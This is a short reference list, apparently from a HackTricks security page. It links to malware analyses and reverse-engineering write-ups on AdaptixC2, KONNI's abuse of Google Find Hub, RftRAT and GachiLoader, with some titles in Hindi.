- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT Windows घुसपैठ के बाद Android डिवाइसों को मिटाने के लिए Google Find Hub का दुरुपयोग करता है – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer तकनीकी विश्लेषण – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
